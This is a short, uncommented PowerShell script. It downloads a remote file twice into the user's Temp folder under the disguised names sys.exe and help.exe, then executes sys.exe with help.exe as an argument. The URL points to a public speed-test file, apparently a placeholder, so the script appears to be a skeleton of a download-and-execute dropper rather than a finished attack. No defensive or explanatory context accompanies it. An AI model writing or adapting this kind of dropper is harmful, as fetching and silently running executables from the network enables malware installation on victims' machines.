$variabel = $env:UserName
$as1 = "C:\Users\" + $variabel + "\AppData\Local\Temp\sys.exe"
$as2 = "C:\Users\" + $variabel + "\AppData\Local\Temp\help.exe"


$url = "http://mirror.internode.on.net/pub/test/10meg.test"
$output = $as1
$start_time = Get-Date

Invoke-WebRequest -Uri $url -OutFile $output


$url = "http://mirror.internode.on.net/pub/test/10meg.test"
$output = $as2
$start_time = Get-Date

Invoke-WebRequest -Uri $url -OutFile $output


$CMD = $as1
$arg1 = '48'
$arg2 = $as2

& $CMD $arg1 $arg2